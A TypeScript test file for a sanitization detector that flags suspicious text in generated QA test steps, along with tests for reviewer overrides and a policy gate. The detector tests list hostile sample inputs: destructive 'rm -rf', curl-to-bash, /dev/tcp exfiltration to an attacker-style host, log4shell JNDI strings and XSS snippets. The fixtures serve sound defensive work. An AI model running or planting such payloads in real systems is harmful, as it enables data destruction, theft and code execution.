/**
 * Tests for `semantic-content-sanitization.ts` (Issue #1413).
 *
 * Covers:
 *   - Each deny-list category produces the expected `SemanticSuspicionMatch`.
 *   - Benign QC step text never trips the detector (false-positive guard).
 *   - Edge cases: empty / whitespace / null-byte / very long inputs.
 *   - `recordSemanticContentOverride` validates inputs before touching the store.
 *   - `extractSemanticContentOverrides` rebuilds the override map deterministically
 *     from a persisted event log, with later events superseding earlier ones.
 *   - `effectiveSemanticContentBlock` keeps non-overridden errors blocking.
 */

import assert from "node:assert/strict";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";

import {
  REVIEW_GATE_SCHEMA_VERSION,
  TEST_CASE_VALIDATION_REPORT_SCHEMA_VERSION,
  TEST_INTELLIGENCE_CONTRACT_VERSION,
  type GeneratedTestCaseList,
  type ReviewEvent,
  type TestCaseCoverageReport,
  type TestCasePolicyProfile,
  type TestCaseValidationIssue,
  type TestCaseValidationReport,
} from "../contracts/index.js";
import { evaluatePolicyGate } from "./policy-gate.js";
import { cloneEuBankingDefaultProfile } from "./policy-profile.js";
import { createFileSystemReviewStore } from "./review-store.js";
import {
  detectSuspiciousContent,
  effectiveSemanticContentBlock,
  extractSemanticContentOverrides,
  listSemanticContentOverrides,
  recordSemanticContentOverride,
  SEMANTIC_CONTENT_OVERRIDE_KIND_VALUE,
  SEMANTIC_CONTENT_OVERRIDE_MAX_JUSTIFICATION_LENGTH,
  SEMANTIC_CONTENT_OVERRIDE_METADATA_CATEGORY_KEY,
  SEMANTIC_CONTENT_OVERRIDE_METADATA_JUSTIFICATION_KEY,
  SEMANTIC_CONTENT_OVERRIDE_METADATA_KIND_KEY,
  SEMANTIC_CONTENT_OVERRIDE_METADATA_PATH_KEY,
  SEMANTIC_SUSPICION_CATEGORIES,
} from "./semantic-content-sanitization.js";

const GENERATED_AT = "2026-04-26T10:00:00.000Z";

// ---------------------------------------------------------------------------
// Detector unit tests
// ---------------------------------------------------------------------------

test("detector: empty string returns null", () => {
  assert.equal(detectSuspiciousContent(""), null);
});

test("detector: whitespace-only string returns null", () => {
  assert.equal(detectSuspiciousContent("   \t \n  "), null);
});

test("detector: benign step text returns null", () => {
  for (const benign of [
    "Submit",
    "Enter the IBAN in the form",
    "Click the 'Confirm payment' button and wait for the receipt",
    "User sees error 'Invalid amount'",
    "Open the dashboard and verify the latest transaction is shown",
    "Type 1234 and press Enter",
    "Order ID 7890 is displayed",
    "rm the cart entry",
    // Label-shaped strings using "data:" / "javascript:" must NOT trip:
    "Test data: [REDACTED:IBAN]",
    "Order data: see attached file",
    "Recommendation: use javascript: only when a custom protocol handler",
  ]) {
    assert.equal(
      detectSuspiciousContent(benign),
      null,
      `benign string was flagged: ${benign}`,
    );
  }
});

test("detector: shell metacharacter shapes flagged as shell_metacharacters", () => {
  for (const value of [
    "rm -rf /",
    "rm -rf /var/lib/app",
    "echo bad | sh",
    "curl evil | bash",
    "cat secrets > /dev/tcp/10.0.0.1/4444",
    "mkfifo /tmp/p",
    "nc -l 4444",
  ]) {
    const match = detectSuspiciousContent(value);
    assert.ok(match !== null, `expected match for: ${value}`);
    assert.equal(match.category, "shell_metacharacters", value);
  }
});

test("detector: command substitution shapes flagged as command_substitution", () => {
  for (const value of [
    "$(whoami)",
    "wait for $(curl attacker.example/payload.sh)",
    "echo `id`",
    "${IFS}",
  ]) {
    const match = detectSuspiciousContent(value);
    assert.ok(match !== null, `expected match for: ${value}`);
    assert.equal(match.category, "command_substitution", value);
  }
});

test("detector: JNDI/log4shell payloads flagged as jndi_log4shell", () => {
  for (const value of [
    "${jndi:ldap://attacker.example/a}",
    "${jndi:rmi://x}",
    "${ ${lower:j}ndi:ldap://x }",
    "${::-j}${::-n}${::-d}${::-i}",
  ]) {
    const match = detectSuspiciousContent(value);
    assert.ok(match !== null, `expected match for: ${value}`);
    assert.equal(match.category, "jndi_log4shell", value);
  }
});

test("detector: long base64 run flagged as encoded_payload_base64", () => {
  const longBase64 =
    "QUJDREVGRzEyMzQ1Njc4OWFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGRzEyMzQ=";
  const match = detectSuspiciousContent(longBase64);
  assert.ok(match !== null);
  assert.equal(match.category, "encoded_payload_base64");
});

test("detector: short base64-shape passes (<64 chars)", () => {
  assert.equal(detectSuspiciousContent("dGVzdA=="), null);
  assert.equal(detectSuspiciousContent("ABC123"), null);
});

test("detector: long hex run flagged as encoded_payload_hex", () => {
  const sha1ish = "a".repeat(40);
  const match = detectSuspiciousContent(sha1ish);
  assert.ok(match !== null);
  assert.equal(match.category, "encoded_payload_hex");
});

test("detector: short hex passes (<40 chars)", () => {
  assert.equal(detectSuspiciousContent("abcdef0123"), null);
});

test("detector: <script> tag flagged as script_tag", () => {
  for (const value of [
    "<script>alert(1)</script>",
    "<sCrIpT src='evil.js'>",
    "<script>",
  ]) {
    const match = detectSuspiciousContent(value);
    assert.ok(match !== null, `expected match for: ${value}`);
    assert.equal(match.category, "script_tag", value);
  }
});

test("detector: inline event handler flagged as html_event_handler", () => {
  for (const value of [
    "<div onclick=alert(1)>",
    `<img src=x onerror="evil()" />`,
    "<a onmouseover='x()'>",
  ]) {
    const match = detectSuspiciousContent(value);
    assert.ok(match !== null, `expected match for: ${value}`);
    assert.equal(match.category, "html_event_handler", value);
  }
});

test("detector: dangerous URL schemes flagged as dangerous_url_scheme", () => {
  for (const value of [
    "click javascript:alert(1)",
    "open data:text/plain,deadbeef",
    "vbscript:msgbox 1",
  ]) {
    const match = detectSuspiciousContent(value);
    assert.ok(match !== null, `expected match for: ${value}`);
    assert.equal(match.category, "dangerous_url_scheme", value);
  }
});

test("detector: detection order — JNDI/script_tag take precedence over URL scheme", () => {
  // `data:` + `<script>` triggers script_tag (intentionally; XSS shape is
  // the more specific match).
  const m = detectSuspiciousContent("use data:text/html,<script>x()</script>");
  assert.ok(m !== null);
  assert.equal(m.category, "script_tag");
});

test("detector: matchedSnippet is bounded to 64 chars", () => {
  const long = `rm -rf /${"x".repeat(500)}`;
  const match = detectSuspiciousContent(long);
  assert.ok(match !== null);
  assert.ok(match.matchedSnippet.length <= 64);
});

test("detector: input longer than 16k is clipped without crash", () => {
  const big = "a".repeat(20_000) + "rm -rf /";
  // The bytes after the clip are unreachable; the test verifies no throw.
  assert.doesNotThrow(() => detectSuspiciousContent(big));
});

test("detector: SEMANTIC_SUSPICION_CATEGORIES is the closed list", () => {
  assert.deepEqual([...SEMANTIC_SUSPICION_CATEGORIES].sort(), [
    "command_substitution",
    "dangerous_url_scheme",
    "encoded_payload_base64",
    "encoded_payload_hex",
    "html_event_handler",
    "jndi_log4shell",
    "script_tag",
    "shell_metacharacters",
  ]);
});

// ---------------------------------------------------------------------------
// Override recording + extraction
// ---------------------------------------------------------------------------

const buildListForOverride = (): GeneratedTestCaseList => ({
  schemaVersion: "1.0.0",
  jobId: "job-1",
  testCases: [
    {
      id: "tc-1",
      sourceJobId: "job-1",
      contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
      schemaVersion: "1.0.0",
      promptTemplateVersion: "1.0.0",
      title: "T",
      objective: "O",
      level: "system",
      type: "functional",
      priority: "p1",
      riskCategory: "low",
      technique: "use_case",
      preconditions: [],
      testData: [],
      steps: [{ index: 1, action: "rm -rf /", expected: "x" }],
      expectedResults: ["x"],
      figmaTraceRefs: [{ screenId: "s-1" }],
      assumptions: [],
      openQuestions: [],
      qcMappingPreview: { exportable: true },
      qualitySignals: {
        coveredFieldIds: [],
        coveredActionIds: [],
        coveredValidationIds: [],
        coveredNavigationIds: [],
        confidence: 0.9,
      },
      reviewState: "draft",
      audit: {
        jobId: "job-1",
        generatedAt: GENERATED_AT,
        contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
        schemaVersion: "1.0.0",
        promptTemplateVersion: "1.0.0",
        redactionPolicyVersion: "1.0.0",
        visualSidecarSchemaVersion: "1.0.0",
        cacheHit: false,
        cacheKey: "k",
        inputHash: "0".repeat(64),
        promptHash: "0".repeat(64),
        schemaHash: "0".repeat(64),
      },
    },
  ],
});

const buildEvent = (
  overrides: Partial<ReviewEvent> & {
    testCaseId: string;
    metadata: ReviewEvent["metadata"];
    actor: string;
    id: string;
    sequence: number;
    at: string;
  },
): ReviewEvent => ({
  schemaVersion: REVIEW_GATE_SCHEMA_VERSION,
  contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
  jobId: "job-1",
  kind: "note",
  fromState: "needs_review",
  toState: "needs_review",
  ...overrides,
});

test("recordSemanticContentOverride: refuses empty actor / justification / path / testCaseId", async () => {
  const dir = await mkdtemp(join(tmpdir(), "sem-override-"));
  try {
    const store = createFileSystemReviewStore({ destinationDir: dir });
    const baseInput = {
      jobId: "job-1",
      testCaseId: "tc-1",
      path: "$.testCases[0].steps[0].action",
      category: "shell_metacharacters" as const,
      actor: "alice",
      justification: "intentional admin smoke-test step",
      at: GENERATED_AT,
    };
    assert.deepEqual(
      await recordSemanticContentOverride(store, {
        ...baseInput,
        actor: "",
      }),
      { ok: false, code: "actor_required" },
    );
    assert.deepEqual(
      await recordSemanticContentOverride(store, {
        ...baseInput,
        justification: "  ",
      }),
      { ok: false, code: "justification_required" },
    );
    assert.deepEqual(
      await recordSemanticContentOverride(store, { ...baseInput, path: "" }),
      { ok: false, code: "path_required" },
    );
    assert.deepEqual(
      await recordSemanticContentOverride(store, {
        ...baseInput,
        testCaseId: "",
      }),
      { ok: false, code: "test_case_id_required" },
    );
    assert.deepEqual(
      await recordSemanticContentOverride(store, {
        ...baseInput,
        justification: "x".repeat(
          SEMANTIC_CONTENT_OVERRIDE_MAX_JUSTIFICATION_LENGTH + 1,
        ),
      }),
      { ok: false, code: "justification_too_long" },
    );
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("extractSemanticContentOverrides: ignores non-override notes; later events supersede earlier ones", () => {
  const earlier = buildEvent({
    id: "evt-a",
    sequence: 1,
    actor: "alice",
    at: "2026-04-26T10:00:00.000Z",
    testCaseId: "tc-1",
    metadata: {
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_KIND_KEY]:
        SEMANTIC_CONTENT_OVERRIDE_KIND_VALUE,
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_PATH_KEY]:
        "$.testCases[0].steps[0].action",
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_CATEGORY_KEY]: "shell_metacharacters",
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_JUSTIFICATION_KEY]: "first",
    },
  });
  const later = buildEvent({
    id: "evt-b",
    sequence: 2,
    actor: "bob",
    at: "2026-04-26T11:00:00.000Z",
    testCaseId: "tc-1",
    metadata: {
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_KIND_KEY]:
        SEMANTIC_CONTENT_OVERRIDE_KIND_VALUE,
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_PATH_KEY]:
        "$.testCases[0].steps[0].action",
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_CATEGORY_KEY]: "shell_metacharacters",
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_JUSTIFICATION_KEY]: "second",
    },
  });
  const irrelevantNote = buildEvent({
    id: "evt-c",
    sequence: 3,
    actor: "carol",
    at: "2026-04-26T11:30:00.000Z",
    testCaseId: "tc-1",
    metadata: { reason: "general comment" },
  });

  const map = extractSemanticContentOverrides([earlier, later, irrelevantNote]);
  assert.equal(map.size, 1);
  const paths = map.get("tc-1");
  assert.ok(paths !== undefined);
  assert.equal(paths.size, 1);
  assert.ok(paths.has("$.testCases[0].steps[0].action"));

  const list = listSemanticContentOverrides([earlier, later, irrelevantNote]);
  assert.equal(list.length, 1);
  assert.equal(list[0]?.justification, "second");
  assert.equal(list[0]?.actor, "bob");
});

test("extractSemanticContentOverrides: rejects malformed metadata (missing path / category / justification)", () => {
  const e1 = buildEvent({
    id: "evt-1",
    sequence: 1,
    actor: "alice",
    at: GENERATED_AT,
    testCaseId: "tc-1",
    metadata: {
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_KIND_KEY]:
        SEMANTIC_CONTENT_OVERRIDE_KIND_VALUE,
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_PATH_KEY]: "",
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_CATEGORY_KEY]: "shell_metacharacters",
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_JUSTIFICATION_KEY]: "x",
    },
  });
  const e2 = buildEvent({
    id: "evt-2",
    sequence: 2,
    actor: "alice",
    at: GENERATED_AT,
    testCaseId: "tc-1",
    metadata: {
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_KIND_KEY]:
        SEMANTIC_CONTENT_OVERRIDE_KIND_VALUE,
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_PATH_KEY]: "p",
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_CATEGORY_KEY]: "not-a-category",
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_JUSTIFICATION_KEY]: "x",
    },
  });
  const e3 = buildEvent({
    id: "evt-3",
    sequence: 3,
    actor: "alice",
    at: GENERATED_AT,
    testCaseId: "tc-1",
    metadata: {
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_KIND_KEY]:
        SEMANTIC_CONTENT_OVERRIDE_KIND_VALUE,
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_PATH_KEY]: "p",
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_CATEGORY_KEY]: "shell_metacharacters",
      [SEMANTIC_CONTENT_OVERRIDE_METADATA_JUSTIFICATION_KEY]: "  ",
    },
  });
  const map = extractSemanticContentOverrides([e1, e2, e3]);
  assert.equal(map.size, 0);
});

// ---------------------------------------------------------------------------
// effectiveSemanticContentBlock + policy-gate integration
// ---------------------------------------------------------------------------

const semanticIssue = (path: string): TestCaseValidationIssue => ({
  testCaseId: "tc-1",
  path,
  code: "semantic_suspicious_content",
  severity: "error",
  message: "shell_metacharacters: matches destructive shell-command shape",
});

const buildValidationReport = (
  issues: TestCaseValidationIssue[],
): TestCaseValidationReport => ({
  schemaVersion: TEST_CASE_VALIDATION_REPORT_SCHEMA_VERSION,
  contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
  generatedAt: GENERATED_AT,
  jobId: "job-1",
  totalTestCases: 1,
  errorCount: issues.filter((i) => i.severity === "error").length,
  warningCount: issues.filter((i) => i.severity === "warning").length,
  blocked: issues.some((i) => i.severity === "error"),
  issues,
});

test("effectiveSemanticContentBlock: covered semantic finding stops blocking", () => {
  const report = buildValidationReport([
    semanticIssue("$.testCases[0].steps[0].action"),
  ]);
  assert.equal(report.blocked, true);
  const map = new Map<string, Set<string>>([
    ["tc-1", new Set(["$.testCases[0].steps[0].action"])],
  ]);
  assert.equal(effectiveSemanticContentBlock(report, map), false);
});

test("effectiveSemanticContentBlock: uncovered path keeps blocking", () => {
  const report = buildValidationReport([
    semanticIssue("$.testCases[0].steps[0].action"),
    semanticIssue("$.testCases[0].expectedResults[0]"),
  ]);
  const map = new Map<string, Set<string>>([
    ["tc-1", new Set(["$.testCases[0].steps[0].action"])],
  ]);
  assert.equal(effectiveSemanticContentBlock(report, map), true);
});

test("effectiveSemanticContentBlock: non-semantic error always keeps blocking", () => {
  const report = buildValidationReport([
    {
      testCaseId: "tc-1",
      path: "$.testCases[0].steps",
      code: "step_action_empty",
      severity: "error",
      message: "step action must not be whitespace-only",
    },
  ]);
  const map = new Map<string, Set<string>>([
    ["tc-1", new Set(["$.testCases[0].steps[0].action"])],
  ]);
  assert.equal(effectiveSemanticContentBlock(report, map), true);
});

const buildCoverage = (): TestCaseCoverageReport => ({
  schemaVersion: "1.0.0",
  contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
  generatedAt: GENERATED_AT,
  jobId: "job-1",
  policyProfileId: "eu-banking-default",
  totalTestCases: 1,
  fieldCoverage: { total: 0, covered: 0, ratio: 0, uncoveredIds: [] },
  actionCoverage: { total: 0, covered: 0, ratio: 0, uncoveredIds: [] },
  validationCoverage: { total: 0, covered: 0, ratio: 0, uncoveredIds: [] },
  navigationCoverage: { total: 0, covered: 0, ratio: 0, uncoveredIds: [] },
  traceCoverage: { total: 1, withTrace: 1, ratio: 1 },
  negativeCaseCount: 0,
  validationCaseCount: 0,
  boundaryCaseCount: 0,
  accessibilityCaseCount: 0,
  workflowCaseCount: 0,
  positiveCaseCount: 1,
  assumptionsRatio: 0,
  openQuestionsCount: 0,
  duplicatePairs: [],
});

test("policy-gate: respects semanticContentOverrides — overridden case downgraded to needs_review with annotated rule", () => {
  const list = buildListForOverride();
  const intent = {
    version: "1.0.0",
    source: { kind: "figma_local_json", contentHash: "0".repeat(64) },
    screens: [{ screenId: "s-1", screenName: "S", trace: { nodeId: "s-1" } }],
    detectedFields: [],
    detectedActions: [],
    detectedValidations: [],
    detectedNavigation: [],
    inferredBusinessObjects: [],
    risks: [],
    assumptions: [],
    openQuestions: [],
    piiIndicators: [],
    redactions: [],
  } as const;
  const profile: TestCasePolicyProfile = cloneEuBankingDefaultProfile();
  const validation = buildValidationReport([
    semanticIssue("$.testCases[0].steps[0].action"),
  ]);
  const coverage = buildCoverage();

  const reportWithoutOverride = evaluatePolicyGate({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list,
    intent,
    profile,
    validation,
    coverage,
  });
  const decisionWithout = reportWithoutOverride.decisions.find(
    (d) => d.testCaseId === "tc-1",
  );
  assert.equal(decisionWithout?.decision, "blocked");
  assert.ok(
    decisionWithout?.violations.some(
      (v) =>
        v.outcome === "semantic_suspicious_content" &&
        v.rule === "validation:semantic_suspicious_content" &&
        v.severity === "error",
    ),
    "without override the violation must be a blocking error",
  );

  const overrides = new Map<string, Set<string>>([
    ["tc-1", new Set(["$.testCases[0].steps[0].action"])],
  ]);
  const reportWithOverride = evaluatePolicyGate({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list,
    intent,
    profile,
    validation,
    coverage,
    semanticContentOverrides: overrides,
  });
  const decisionWith = reportWithOverride.decisions.find(
    (d) => d.testCaseId === "tc-1",
  );
  assert.equal(
    decisionWith?.decision,
    "needs_review",
    "override must downgrade decision from blocked to needs_review",
  );
  assert.ok(
    decisionWith?.violations.some(
      (v) =>
        v.outcome === "semantic_suspicious_content" &&
        v.rule === "validation:semantic_suspicious_content:overridden" &&
        v.severity === "warning",
    ),
    "override must annotate the violation rule and downgrade severity",
  );
  assert.equal(reportWithOverride.blocked, false);
});

test("policy-gate: override map without matching path leaves the case blocked", () => {
  const list = buildListForOverride();
  const intent = {
    version: "1.0.0",
    source: { kind: "figma_local_json", contentHash: "0".repeat(64) },
    screens: [{ screenId: "s-1", screenName: "S", trace: { nodeId: "s-1" } }],
    detectedFields: [],
    detectedActions: [],
    detectedValidations: [],
    detectedNavigation: [],
    inferredBusinessObjects: [],
    risks: [],
    assumptions: [],
    openQuestions: [],
    piiIndicators: [],
    redactions: [],
  } as const;
  const profile = cloneEuBankingDefaultProfile();
  const validation = buildValidationReport([
    semanticIssue("$.testCases[0].steps[0].action"),
  ]);
  const coverage = buildCoverage();
  const overrides = new Map<string, Set<string>>([
    ["tc-1", new Set(["$.testCases[0].expectedResults[0]"])],
  ]);
  const result = evaluatePolicyGate({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list,
    intent,
    profile,
    validation,
    coverage,
    semanticContentOverrides: overrides,
  });
  const decision = result.decisions.find((d) => d.testCaseId === "tc-1");
  assert.equal(decision?.decision, "blocked");
});

// ---------------------------------------------------------------------------
// End-to-end: detect → record override via store → re-evaluate → blocked flips
// ---------------------------------------------------------------------------

test("end-to-end: reviewer override note recorded via store flips effective block", async () => {
  const dir = await mkdtemp(join(tmpdir(), "sem-override-e2e-"));
  try {
    const store = createFileSystemReviewStore({ destinationDir: dir });
    await store.seedSnapshot({
      jobId: "job-1",
      generatedAt: GENERATED_AT,
      list: buildListForOverride(),
      policy: {
        schemaVersion: "1.0.0",
        contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
        generatedAt: GENERATED_AT,
        jobId: "job-1",
        policyProfileId: "eu-banking-default",
        policyProfileVersion: "1.0.0",
        totalTestCases: 1,
        approvedCount: 0,
        blockedCount: 1,
        needsReviewCount: 0,
        blocked: true,
        decisions: [
          {
            testCaseId: "tc-1",
            decision: "blocked",
            violations: [],
          },
        ],
        jobLevelViolations: [],
      },
    });

    const result = await recordSemanticContentOverride(store, {
      jobId: "job-1",
      testCaseId: "tc-1",
      path: "$.testCases[0].steps[0].action",
      category: "shell_metacharacters",
      actor: "alice@bank.example",
      justification:
        "intentional ops smoke test for destructive-command alerting; reviewed under change request CR-1413",
      at: GENERATED_AT,
    });
    assert.equal(result.ok, true, JSON.stringify(result));

    const events = await store.listEvents("job-1");
    const overrideEvents = events.filter(
      (e) =>
        e.kind === "note" &&
        e.metadata?.[SEMANTIC_CONTENT_OVERRIDE_METADATA_KIND_KEY] ===
          SEMANTIC_CONTENT_OVERRIDE_KIND_VALUE,
    );
    assert.equal(overrideEvents.length, 1);

    const overrides = extractSemanticContentOverrides(events);
    const validation = buildValidationReport([
      semanticIssue("$.testCases[0].steps[0].action"),
    ]);
    assert.equal(validation.blocked, true);
    assert.equal(effectiveSemanticContentBlock(validation, overrides), false);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});
